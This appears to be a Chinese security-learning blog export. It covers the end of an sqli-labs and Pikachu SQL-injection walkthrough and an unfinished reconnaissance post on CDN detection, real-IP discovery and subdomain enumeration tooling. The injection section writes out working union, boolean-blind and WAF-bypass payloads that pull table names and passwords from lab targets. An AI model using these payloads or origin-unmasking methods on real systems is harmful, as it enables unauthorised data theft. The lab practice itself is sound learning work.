<figure class="highlight sql"><table><tbody><tr><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">-1</span><span class="string">'union select 1,2,(select group_concat(table_name) from information_schema.tables where table_schema='</span>challenges<span class="string">')%23</span></span><br><span class="line"><span class="string">1KBD9AIPC9</span></span><br></pre></td></tr></tbody></table></figure>

<p>查字段名</p>
<figure class="highlight sql"><table><tbody><tr><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">-1</span><span class="string">'union select 1,2,(select group_concat(column_name) from information_schema.columns where table_name='</span><span class="number">1</span>KBD9AIPC9<span class="string">')%23</span></span><br><span class="line"><span class="string">id,sessid,secret_2TF1,tryy</span></span><br></pre></td></tr></tbody></table></figure>

<p>查key值</p>
<figure class="highlight sql"><table><tbody><tr><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">-1</span><span class="string">'union select 1,2,(select concat(secret_2TF1) from challenges.1KBD9AIPC9)%23</span></span><br><span class="line"><span class="string">vJWlm4ld9mZEZN2o7n59t4A8</span></span><br></pre></td></tr></tbody></table></figure>

<p>总共八次。</p>
<h4 id="3-5-2-Less-55"><a href="#3-5-2-Less-55" class="headerlink" title="3.5.2 Less-55"></a>3.5.2 Less-55</h4><p>无区别。</p>
<h4 id="3-5-3-Less-56"><a href="#3-5-3-Less-56" class="headerlink" title="3.5.3 Less-56"></a>3.5.3 Less-56</h4><p>无区别。</p>
<h4 id="3-5-4-Less-57"><a href="#3-5-4-Less-57" class="headerlink" title="3.5.4 Less-57"></a>3.5.4 Less-57</h4><p>无区别。</p>
<h4 id="3-5-5-Less-58"><a href="#3-5-5-Less-58" class="headerlink" title="3.5.5 Less-58"></a>3.5.5 Less-58</h4><figure class="highlight php"><table><tbody><tr><td class="code"><pre><span class="line"><span class="variable">$sql</span>=<span class="string">"SELECT * FROM security.users WHERE id='<span class="subst">$id</span>' LIMIT 0,1"</span>;</span><br><span class="line"><span class="keyword">if</span> <span class="literal">true</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">'Your Login name : '</span>. <span class="variable">$unames</span>[<span class="variable">$row</span>[<span class="string">'id'</span>]];</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">'Your Password : '</span> .<span class="variable">$pass</span>[<span class="variable">$row</span>[<span class="string">'id'</span>]];</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">    <span class="title function_ invoke__">print_r</span>(<span class="title function_ invoke__">mysql_error</span>());</span><br></pre></td></tr></tbody></table></figure>

<p>联合查询没结果输出，改为报错注入。</p>
<h4 id="3-5-6-Less-59"><a href="#3-5-6-Less-59" class="headerlink" title="3.5.6 Less-59"></a>3.5.6 Less-59</h4><p>无区别。</p>
<h4 id="3-5-7-Less-60"><a href="#3-5-7-Less-60" class="headerlink" title="3.5.7 Less-60"></a>3.5.7 Less-60</h4><p>无区别。</p>
<h4 id="3-5-8-Less-61"><a href="#3-5-8-Less-61" class="headerlink" title="3.5.8 Less-61"></a>3.5.8 Less-61</h4><p>无区别。</p>
<h4 id="3-5-9-Less-62"><a href="#3-5-9-Less-62" class="headerlink" title="3.5.9 Less-62"></a>3.5.9 Less-62</h4><figure class="highlight php"><table><tbody><tr><td class="code"><pre><span class="line"><span class="variable">$sql</span>=<span class="string">"SELECT * FROM security.users WHERE id=('<span class="subst">$id</span>') LIMIT 0,1"</span>;</span><br><span class="line"><span class="keyword">if</span> <span class="literal">true</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">'Your Login name : '</span>. <span class="variable">$unames</span>[<span class="variable">$row</span>[<span class="string">'id'</span>]];</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">'Your Password : '</span> .<span class="variable">$pass</span>[<span class="variable">$row</span>[<span class="string">'id'</span>]];</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">    <span class="comment">//print_r(mysql_error());</span></span><br></pre></td></tr></tbody></table></figure>

<p>不能报错注入了，改为布尔盲注或者时间盲注即可</p>
<h4 id="3-5-9-Less-63"><a href="#3-5-9-Less-63" class="headerlink" title="3.5.9 Less-63"></a>3.5.9 Less-63</h4><p>无区别。</p>
<h4 id="3-5-10-Less-64"><a href="#3-5-10-Less-64" class="headerlink" title="3.5.10 Less-64"></a>3.5.10 Less-64</h4><p>无区别。</p>
<h4 id="3-5-1-Less-65"><a href="#3-5-1-Less-65" class="headerlink" title="3.5.1 Less-65"></a>3.5.1 Less-65</h4><p>无区别。</p>
<h3 id="3-6-总结"><a href="#3-6-总结" class="headerlink" title="3.6 总结"></a>3.6 总结</h3><p>终于是刷完了，总体来说把每种注入方式都练习了个遍，并学习了一些绕过手法，整个过程除了<code>Less-1</code>跟着大佬把<code>sqlmap</code>使用熟悉了一下，其余均为手注，加强自己的能力，尽量不变成离了脚本就活不了的脚本小子（）。但是其实还有许多利用手法没有学到，以后遇到就在本文填补，避免做完就忘了。</p>
<h2 id="4-SQL注入绕过小实战"><a href="#4-SQL注入绕过小实战" class="headerlink" title="4 SQL注入绕过小实战"></a>4 SQL注入绕过小实战</h2><figure class="highlight sql"><table><tbody><tr><td class="code"><pre><span class="line">?name<span class="operator">=</span>vince<span class="string">'</span></span><br><span class="line"><span class="string"># You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ''vince'''</span> <span class="keyword">at</span> line <span class="number">1</span></span><br></pre></td></tr></tbody></table></figure>

<p>可以看见是存在sql注入的</p>
<figure class="highlight sql"><table><tbody><tr><td class="code"><pre><span class="line">?name<span class="operator">=</span>vince<span class="string">'and+1=1--+</span></span><br></pre></td></tr></tbody></table></figure>

<img src="/posts/31899/image-20250319223257723.png" class="" title="image-20250319223257723">

<figure class="highlight sql"><table><tbody><tr><td class="code"><pre><span class="line">?name<span class="operator">=</span>vince<span class="string">'and+0x2!=1--+</span></span><br><span class="line"><span class="string"># your uid:1</span></span><br><span class="line"><span class="string">your email is: vince@pikachu.com</span></span><br></pre></td></tr></tbody></table></figure>

<p>成功绕过</p>
<figure class="highlight sql"><table><tbody><tr><td class="code"><pre><span class="line">?name<span class="operator">=</span>vince<span class="string">'and+substr(user()+from+1+for+1)--+</span></span><br></pre></td></tr></tbody></table></figure>

<p>被拦截，尝试使用布尔绕过</p>
<figure class="highlight bash"><table><tbody><tr><td class="code"><pre><span class="line">?name=vince<span class="string">'and+0x31!=if((substr((select+password+from+`users`+limit+1)from+1+for+1)='</span>a<span class="string">'),0x31,0)--+  # 回显</span></span><br><span class="line"><span class="string">?name=vince'</span>and+0x31!=<span class="keyword">if</span>((substr((select+password+from+`users`+limit+<span class="number">1</span>)from+<span class="number">1</span>+for+<span class="number">1</span>)='e'),<span class="number">0</span>x31,<span class="number">0</span>)--+  # 不回显</span><br></pre></td></tr></tbody></table></figure>

<p>尝试联合注入</p>
<figure class="highlight sql"><table><tbody><tr><td class="code"><pre><span class="line">?name<span class="operator">=</span>vince<span class="string">'order+by+1--+ # 被拦截</span></span><br><span class="line"><span class="string">?name=vince'</span><span class="keyword">order</span><span class="comment">/**/</span><span class="keyword">by</span><span class="operator">+</span><span class="number">1</span><span class="comment">--+ # 被拦截</span></span><br><span class="line">?name<span class="operator">=</span>vince<span class="string">'order/*//*/by+1--+  # 成功绕过</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">?name=vince'</span><span class="keyword">order</span><span class="comment">/*//*/</span><span class="keyword">by</span><span class="operator">+</span><span class="number">2</span><span class="comment">--+	# 回显</span></span><br><span class="line">?name<span class="operator">=</span>vince<span class="string">'order/*//*/by+3--+	# 无回显</span></span><br></pre></td></tr></tbody></table></figure>

<p>因此这里只有两个字段</p>
<figure class="highlight sql"><table><tbody><tr><td class="code"><pre><span class="line">?name<span class="operator">=</span>vince<span class="string">'union+select+1,2--+	# 被拦截</span></span><br><span class="line"><span class="string">?name=vince'</span><span class="keyword">union</span><span class="comment">/*//*/</span><span class="keyword">select</span><span class="operator">+</span><span class="number">1</span>,<span class="number">2</span><span class="comment">--+	# 被拦截</span></span><br><span class="line">?name<span class="operator">=</span>vince<span class="string">'union/*////*/select+1,2--+	# 被拦截</span></span><br><span class="line"><span class="string">?name=vince'</span><span class="keyword">union</span><span class="comment">/*//--+//*/</span><span class="keyword">select</span><span class="operator">+</span><span class="number">1</span>,<span class="number">2</span><span class="comment">--+	# 成功绕过</span></span><br></pre></td></tr></tbody></table></figure>

<p>查数据库名</p>
<figure class="highlight sql"><table><tbody><tr><td class="code"><pre><span class="line">?name<span class="operator">=</span>vince<span class="string">'union/*//--+//*/select+1,(select+concat(schema_name)+from+information_schema.schemata)--+	# 被拦截</span></span><br><span class="line"><span class="string">?name=vince'</span><span class="keyword">union</span><span class="comment">/*//--+//*/</span><span class="keyword">select</span><span class="operator">+</span><span class="number">1</span>,(database<span class="comment">/*//--+//*/</span>())<span class="comment">--+	# 成功绕过</span></span><br><span class="line"># myp1</span><br></pre></td></tr></tbody></table></figure>

<p>查表名</p>
<figure class="highlight sql"><table><tbody><tr><td class="code"><pre><span class="line">?name<span class="operator">=</span>vince<span class="string">'union/*//--+//*/select+1,(select+concat(table_name)+from+information_schema.tables+where+table_schema=`myp1`)--+	# 被拦截</span></span><br></pre></td></tr></tbody></table></figure>

<p>经过测试过滤了<code>information_schema</code>，尝试使用<code>sys.schema_auto_increment_columns</code>、<code>mysql.innodb_table_stats</code>和<code>mysql.innodb_table_index</code>都绕过无果。（其实绕过了，但是查询权限不足<code>﻿SELECT command denied to user 'myp1'@'localhost' for table 'x$schema_table_statistics_with_buffer'</code>）</p>
<p>尝试双写和编码都绕过了，也没权限，应该确实没办法了</p>
]]></content>
      <tags>
        <tag>网络安全</tag>
      </tags>
  </entry>
  <entry>
    <title>信息收集(TODO)</title>
    <url>/posts/56033/</url>
    <content><![CDATA[<h1 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h1><blockquote>
<p>信息收集是渗透测试中的第一步，也是最为关键的一步。有大佬说过：渗透测试的本质就是信息收集。因此在这里认真钻研一下信息收集部分，包括收集什么？如何收集？自动化工具的原理？也尽量自己在每个模块开发出自己的工具，最终整合成自己的信息收集工具。</p>
</blockquote>
<h2 id="域名（Domain）"><a href="#域名（Domain）" class="headerlink" title="域名（Domain）"></a>域名（Domain）</h2><blockquote>
<p>域名是由一串用点分隔的字符组成的互联网上某一台计算机或计算机组的名称，用于在数据传输时标识计算机的电子方位。域名是IP地址的代称，目的是便于记忆。一般渗透都会从一个域名开始，因此由域名开始作为切入口。</p>
</blockquote>
<h3 id="判断CDN"><a href="#判断CDN" class="headerlink" title="判断CDN"></a>判断CDN</h3><p>内容分发网络（Content Delivery Network）的基本思路是尽可能避开互联网上有可能影响数据传输速度和稳定性的瓶颈和环节，使内容传输更快更稳定。那这对我们渗透测试带来了什么影响呢？</p>
<p>CDN会代理客户端的请求，将真实服务器的IP地址隐藏，让我们无法直接定位目标服务器，因此需要绕过CDN。</p>
<p><strong>ping域名判断是否有CDN</strong></p>
<p>当ping出来的域名为很长一串字符，或者有着很明显的cdn、ali、tencent等字段时大概率存在CDN。</p>
<p><img src="https://cdn.jsdelivr.net/gh/Squarehhh/DrawingBed/myblog/20241121133118.png" alt="img"></p>
<p><strong>nslookup判断CDN</strong></p>
<p>nslookup是一个命令行工具，用于查询Internet域名信息或诊断DNS服务器问题。</p>
<p>通过nslookup检测一个域名是否对应多个IP可以判断是否使用CDN</p>
<p><img src="https://cdn.jsdelivr.net/gh/Squarehhh/DrawingBed/myblog/20241121133620.png" alt="img"></p>
<p><strong>多地ping判断CDN</strong></p>
<p><a href="https://ping.chinaz.com/">站长工具</a>还是比较直观的</p>
<p><img src="https://cdn.jsdelivr.net/gh/Squarehhh/DrawingBed/myblog/20241121133805.png" alt="img"></p>
<h3 id="查看真实IP"><a href="#查看真实IP" class="headerlink" title="查看真实IP"></a>查看真实IP</h3><p>检测完CDN，就该绕过CDN检测了，获取真实IP</p>
<p><strong>多地ping</strong></p>
<p>不仅是检测CDN，同时也可以用来判断。</p>
<p>如<code>www.youzan.com</code>，可以发现存在CDN，但是发现在除中国大陆外都是同一个IP，因此可以判断为真实IP</p>
<p><img src="https://cdn.jsdelivr.net/gh/Squarehhh/DrawingBed/myblog/20241121134240.png" alt="img"></p>
<p><strong>子域名查询真实IP</strong></p>
<p>CDN并非免费的，成本较大，因此很多公司可能只对主站或者访问量较大的站做了CDN加速。因此可以通过获取子域名来查询真实IP，查询方式可以利用上述多地ping方法。子域名收集在后面单独讲。</p>
<p><strong>DNS历史记录</strong></p>
<p>查看IP与域名绑定的历史记录，可能存在使用CDN前的解析记录，<a href="https://viewdns.info/">Viewdns</a>或者之前的开发工具都可以查询</p>
<p><strong>SSL证书</strong></p>
<p>加入web服务器支持SSL并具有证书，在端口443直接访问时，SSL证书就会被暴露。此时攻击者会看见一个使用特定证书的IPv4主机列表，真实IP就在其中。</p>
<p><strong>漏洞查找</strong></p>
<ul>
<li>敏感文件泄露，如phpinfo等，github信息泄露等。</li>
<li>XSS、命令执行、SSRF等。</li>
<li>社工等手段，拿到目标管理员在CDN账号，可以在CDN配置找到。</li>
</ul>
<p><strong>网站邮件</strong></p>
<p>很多网站都自带<code>sendmail</code>，会发邮件给我们，此时查看邮件源码里面就会包含服务器的真实IP</p>
<p><strong>F5 LTM解码</strong></p>
<p>当服务器使用FT5 LTM做负载均衡的时候，对set-cookie关键字解码也可以获取真实IP</p>
<figure class="highlight dns"><table><tbody><tr><td class="code"><pre><span class="line">Set-Cookie: BIGipServerpool_<span class="number">8.29_8030</span>=<span class="number">487098378</span>.<span class="number">24095.0000</span></span><br><span class="line">先把第一小节的十进制数取出来：<span class="number">487098378</span></span><br><span class="line">再转化为十六进制数：<span class="number">1d</span>08880a</span><br><span class="line">从后至前取四位数：<span class="number">0</span>a.<span class="number">88</span>.<span class="number">08</span>.<span class="number">1d</span></span><br><span class="line">转化为十进制即为IP：<span class="number">10.136.8.29</span></span><br></pre></td></tr></tbody></table></figure>

<h3 id="子域名收集"><a href="#子域名收集" class="headerlink" title="子域名收集"></a>子域名收集</h3><p>在前面查看真实IP的地方提到了子域名收集，子域名收集不只是为了找真实IP服务，更是为了扩大资产收集范围。</p>
<p><strong>搜索引擎收集</strong></p>
<p>使用谷歌语法等可以收集大量信息，如<code>site:domain</code></p>
<p><img src="https://cdn.jsdelivr.net/gh/Squarehhh/DrawingBed/myblog/20241121143338.png" alt="img"></p>
<p>尝试自己写了个基于Chrome搜索的脚本，爬取效果还是不错的，后面看看能不能增加功能</p>
<figure class="highlight python"><table><tbody><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> argparse</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> signal</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> selenium <span class="keyword">import</span> webdriver</span><br><span class="line"><span class="keyword">from</span> selenium.webdriver.common.by <span class="keyword">import</span> By</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># write to file</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">write_file</span>(<span class="params">file_path, content</span>):</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(file_path, <span class="string">'a'</span>, encoding=<span class="string">'utf-8'</span>) <span class="keyword">as</span> file:</span><br><span class="line">            file.write(content + <span class="string">'\n'</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="built_in">print</span>(e)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># signal handler</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">signal_handler</span>(<span class="params">sig, frame</span>):</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">"\nuser pause"</span>)</span><br><span class="line">    sys.exit(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># init selenium</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">setup_driver</span>():</span><br><span class="line">    options = webdriver.ChromeOptions()</span><br><span class="line">    options.add_argument(<span class="string">"--headless"</span>)</span><br><span class="line">    <span class="keyword">return</span> webdriver.Chrome(options=options)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># get domain in links</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">extract_domain</span>(<span class="params">link</span>):</span><br><span class="line">    <span class="keyword">match</span> = re.search(<span class="string">r"https://(.*?)/"</span>, link)</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">match</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">match</span>.group(<span class="number">1</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># fetch links from result</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">fetch_links</span>(<span class="params">driver, domain, page</span>):</span><br><span class="line">    url = <span class="string">f"https://www.google.com/search?q=site:<span class="subst">{domain}</span>&amp;start=<span class="subst">{page}</span>0"</span></span><br><span class="line">    driver.get(url)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        elements = driver.find_elements(By.CSS_SELECTOR, <span class="string">"#rso .kb0PBd.A9Y9g.jGGQ5e span &gt; a"</span>)</span><br><span class="line">        links = []</span><br><span class="line">        <span class="keyword">for</span> element <span class="keyword">in</span> elements:</span><br><span class="line">            link = element.get_attribute(<span class="string">"href"</span>)</span><br><span class="line">            <span class="keyword">if</span> link:</span><br><span class="line">                links.append(link)</span><br><span class="line">        <span class="keyword">return</span> links</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f"failed to fetch links: <span class="subst">{e}</span>"</span>)</span><br><span class="line">        <span class="keyword">return</span> []</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># main</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    <span class="comment"># signal init</span></span><br><span class="line">    signal.signal(signal.SIGINT, signal_handler)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># parse user input</span></span><br><span class="line">    parser = argparse.ArgumentParser(description=<span class="string">"Chrome search script"</span>)</span><br><span class="line">    parser.add_argument(<span class="string">"-d"</span>, <span class="string">"--domain"</span>, required=<span class="literal">True</span>, <span class="built_in">help</span>=<span class="string">"The domain to search"</span>)</span><br><span class="line">    parser.add_argument(<span class="string">"-m"</span>, <span class="string">"--maxpage"</span>, <span class="built_in">type</span>=<span class="built_in">int</span>, required=<span class="literal">True</span>, <span class="built_in">help</span>=<span class="string">"The maximum number to search"</span>)</span><br><span class="line">    args = parser.parse_args()</span><br><span class="line"></span><br><span class="line">    <span class="comment"># parameter assignment</span></span><br><span class="line">    domain = args.domain</span><br><span class="line">    max_page = args.maxpage</span><br><span class="line"></span><br><span class="line">    <span class="comment"># init driver</span></span><br><span class="line">    driver = setup_driver()</span><br><span class="line"></span><br><span class="line">    <span class="comment"># remove duplicates</span></span><br><span class="line">    unique_links = <span class="built_in">set</span>()</span><br><span class="line"></span><br><span class="line">    <span class="comment"># Start crawling from the first page</span></span><br><span class="line">    <span class="keyword">for</span> page <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, max_page + <span class="number">1</span>):</span><br><span class="line">        links = fetch_links(driver, domain, page)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># Traverse links, extract and save unique domain names</span></span><br><span class="line">        <span class="keyword">for</span> link <span class="keyword">in</span> links:</span><br><span class="line">            domain_name = extract_domain(link)</span><br><span class="line">            <span class="keyword">if</span> domain_name <span class="keyword">and</span> domain_name <span class="keyword">not</span> <span class="keyword">in</span> unique_links:</span><br><span class="line">                unique_links.add(domain_name)</span><br><span class="line">                <span class="built_in">print</span>(domain_name)</span><br><span class="line">                write_file(<span class="string">"domain.txt"</span>, domain_name)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># close driver</span></span><br><span class="line">    driver.quit()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></tbody></table></figure>

<p><strong>资产测绘工具搜集</strong></p>
<p>使用资产测绘工具收集，如<strong>fofa、hunter、360quake、微步</strong>等，包括使用站长之家等等。</p>
<p><img src="https://cdn.jsdelivr.net/gh/Squarehhh/DrawingBed/myblog/20241122163631.png" alt="img"></p>
<p><strong>使用自动化工具</strong></p>
<p>这里对两种开源的工具进行源码分析，了解其原理</p>
<h4 id="SubDomainBrute源码分析"><a href="#SubDomainBrute源码分析" class="headerlink" title="SubDomainBrute源码分析"></a><strong>SubDomainBrute源码分析</strong></h4><p>这里只分析主要代码</p>
<figure class="highlight python"><table><tbody><tr><td class="code"><pre><span class="line"><span class="comment"># 加载DNS服务器地址</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">load_dns_servers</span>():</span><br><span class="line">    print_msg(<span class="string">'[+] Validate DNS servers'</span>, line_feed=<span class="literal">True</span>)</span><br><span class="line">    dns_servers = []</span><br><span class="line"></span><br><span class="line">    servers_to_test = []</span><br><span class="line">    <span class="comment"># 从字典中加载未被注释的DNS服务器地址</span></span><br><span class="line">    <span class="keyword">for</span> server <span class="keyword">in</span> <span class="built_in">open</span>(os.path.join(root_path, <span class="string">'dict/dns_servers.txt'</span>)).readlines():</span><br><span class="line">        server = server.strip()</span><br><span class="line">        <span class="keyword">if</span> server <span class="keyword">and</span> <span class="keyword">not</span> server.startswith(<span class="string">'#'</span>):</span><br><span class="line">            servers_to_test.append(server)</span><br><span class="line"></span><br><span class="line">	<span class="comment"># 异步验证DNS服务器，dns_servers为传入的空列表，保存验证通过的DNS服务器地址</span></span><br><span class="line">    loop = asyncio.get_event_loop()</span><br><span class="line">    loop.run_until_complete(async_load_dns_servers(servers_to_test, dns_servers))</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 打印有效DNS服务器地址</span></span><br><span class="line">    server_count = <span class="built_in">len</span>(dns_servers)</span><br><span class="line">    print_msg(<span class="string">'\n[+] %s DNS Servers found'</span> % server_count, line_feed=<span class="literal">True</span>)</span><br><span class="line">    <span class="keyword">if</span> server_count == <span class="number">0</span>:</span><br><span class="line">        print_msg(<span class="string">'[ERROR] No valid DNS Server !'</span>, line_feed=<span class="literal">True</span>)</span><br><span class="line">        sys.exit(-<span class="number">1</span>)</span><br><span class="line">    <span class="keyword">return</span> dns_servers</span><br><span class="line"></span><br><span class="line"><span class="comment"># 加载子域名爆破字典</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">load_next_sub</span>(<span class="params">full_scan</span>):</span><br><span class="line">    next_subs = []</span><br><span class="line">    <span class="comment"># 根据full_scan参数判断加载哪个字典</span></span><br><span class="line">    _file = <span class="string">'dict/next_sub_full.txt'</span> <span class="keyword">if</span> full_scan <span class="keyword">else</span> <span class="string">'dict/next_sub.txt'</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 将子域名去重后存入临时集合tmp_set</span></span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(os.path.join(root_path, _file)) <span class="keyword">as</span> f:</span><br><span class="line">        <span class="keyword">for</span> line <span class="keyword">in</span> f:</span><br><span class="line">            sub = line.strip()</span><br><span class="line">            <span class="keyword">if</span> sub <span class="keyword">and</span> sub <span class="keyword">not</span> <span class="keyword">in</span> next_subs:</span><br><span class="line">                tmp_set = {sub}</span><br><span class="line">                </span><br><span class="line">                <span class="comment"># 如果子域名模块包含占位符，如{alphnum}，则进行替换操作</span></span><br><span class="line">                <span class="keyword">while</span> tmp_set:</span><br><span class="line">                    item = tmp_set.pop()</span><br><span class="line">                    <span class="keyword">if</span> item.find(<span class="string">'{alphnum}'</span>) &gt;= <span class="number">0</span>:</span><br><span class="line">                        <span class="keyword">for</span> _letter <span class="keyword">in</span> <span class="string">'abcdefghijklmnopqrstuvwxyz0123456789'</span>:</span><br><span class="line">                            tmp_set.add(item.replace(<span class="string">'{alphnum}'</span>, _letter, <span class="number">1</span>))</span><br><span class="line">                    <span class="keyword">elif</span> item.find(<span class="string">'{alpha}'</span>) &gt;= <span class="number">0</span>:</span><br><span class="line">                        <span class="keyword">for</span> _letter <span class="keyword">in</span> <span class="string">'abcdefghijklmnopqrstuvwxyz'</span>:</span><br><span class="line">                            tmp_set.add(item.replace(<span class="string">'{alpha}'</span>, _letter, <span class="number">1</span>))</span><br><span class="line">                    <span class="keyword">elif</span> item.find(<span class="string">'{num}'</span>) &gt;= <span class="number">0</span>:</span><br><span class="line">                        <span class="keyword">for</span> _letter <span class="keyword">in</span> <span class="string">'0123456789'</span>:</span><br><span class="line">                            tmp_set.add(item.replace(<span class="string">'{num}'</span>, _letter, <span class="number">1</span>))</span><br><span class="line">                    <span class="keyword">elif</span> item <span class="keyword">not</span> <span class="keyword">in</span> next_subs:</span><br><span class="line">                        next_subs.append(item)</span><br><span class="line">    <span class="keyword">return</span> next_subs</span><br></pre></td></tr></tbody></table></figure>

<p>加载字典的功能中，使用占位符的方式让这个工具更加灵活，字典文件更加通用，并且通过这个方式可以轻松生成大规模的子域名。</p>
<p>在子域名中还存在一个<strong>泛解析</strong>的问题，这个工具里面解决了这个问题</p>
<figure class="highlight python"><table><tbody><tr><td class="code"><pre><span class="line"><span class="keyword">async</span> <span class="keyword">def</span> <span class="title function_">async_wildcard_test</span>(<span class="params">domain, dns_servers, level=<span class="number">1</span></span>):</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="comment"># 创建异步DNS解析器</span></span><br><span class="line">        r = dns.asyncresolver.Resolver()</span><br><span class="line">        <span class="comment"># 使用DNS服务器解析域名</span></span><br><span class="line">        r.nameservers = dns_servers</span><br><span class="line">        <span class="comment"># 使用异步DNS查询解析A记录，lijiejie-not-existed-test是一个随机的子域名，理论上不存在</span></span><br><span class="line">        answers = <span class="keyword">await</span> r.resolve(<span class="string">'lijiejie-not-existed-test.%s'</span> % domain, <span class="string">'A'</span>, lifetime=<span class="number">10</span>)</span><br><span class="line">        <span class="comment"># 如果解析成功，讲这些IP手机在ips中，如果解析的IP有效，可能意味着域名启用了通配符解析</span></span><br><span class="line">        ips = <span class="string">', '</span>.join(<span class="built_in">sorted</span>([answer.address <span class="keyword">for</span> answer <span class="keyword">in</span> answers]))</span><br><span class="line">        <span class="comment"># 初步检测，生成一个子域名，并递归调用进一步检测，并将level设置为2</span></span><br><span class="line">        <span class="keyword">if</span> level == <span class="number">1</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">'any-sub.%s\t%s'</span> % (domain.ljust(<span class="number">30</span>), ips))</span><br><span class="line">            <span class="keyword">await</span> async_wildcard_test(<span class="string">'any-sub.%s'</span> % domain, dns_servers, <span class="number">2</span>)</span><br><span class="line">        <span class="comment"># 打印提示信息，使用-w参数强制扫描通配符域名</span></span><br><span class="line">        <span class="keyword">elif</span> level == <span class="number">2</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">'\nUse -w to enable force scan wildcard domain'</span>)</span><br><span class="line">            sys.exit(<span class="number">0</span>)</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="keyword">return</span> domain</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">wildcard_test</span>(<span class="params">domain, dns_servers</span>):</span><br><span class="line">    <span class="comment"># 获取当前的异步事件循环</span></span><br><span class="line">    loop = asyncio.get_event_loop()</span><br><span class="line">    <span class="comment"># 等待异步任务完成</span></span><br><span class="line">    <span class="keyword">return</span> loop.run_until_complete(</span><br><span class="line">        <span class="comment"># 并行执行多个异步任务，并返回它们的结果</span></span><br><span class="line">        asyncio.gather(</span><br><span class="line">            async_wildcard_test(domain, dns_servers, level=<span class="number">1</span>)</span><br><span class="line">        )</span><br><span class="line">    )[<span class="number">0</span>]</span><br></pre></td></tr></tbody></table></figure>

<p>通过给出一个不存在的域名检测，判断是否开启了泛解析</p>
<p>接下来看看扫描模块</p>
<figure class="highlight python"><table><tbody><tr><td class="code"><pre><span class="line"><span class="comment"># 爆破模块</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">SubNameBrute</span>(<span class="title class_ inherited__">object</span>):</span><br><span class="line">    <span class="comment"># 初始化</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, *params</span>):</span><br><span class="line">        <span class="comment"># 提取传入参数</span></span><br><span class="line">        <span class="variable language_">self</span>.domain, <span class="variable language_">self</span>.options, <span class="variable language_">self</span>.process_num, <span class="variable language_">self</span>.dns_servers, <span class="variable language_">self</span>.next_subs, \</span><br><span class="line">            <span class="variable language_">self</span>.scan_count, <span class="variable language_">self</span>.found_count, <span class="variable language_">self</span>.queue_size_array, tmp_dir = params</span><br><span class="line">        <span class="variable language_">self</span>.dns_count = <span class="built_in">len</span>(<span class="variable language_">self</span>.dns_servers)</span><br><span class="line">        <span class="variable language_">self</span>.scan_count_local = <span class="number">0</span></span><br><span class="line">        <span class="variable language_">self</span>.found_count_local = <span class="number">0</span></span><br><span class="line">        <span class="comment"># 初始化DNS解析器</span></span><br><span class="line">        <span class="variable language_">self</span>.resolvers = [dns.asyncresolver.Resolver(configure=<span class="literal">False</span>) <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="variable language_">self</span>.options.threads)]</span><br><span class="line">        <span class="keyword">for</span> r <span class="keyword">in</span> <span class="variable 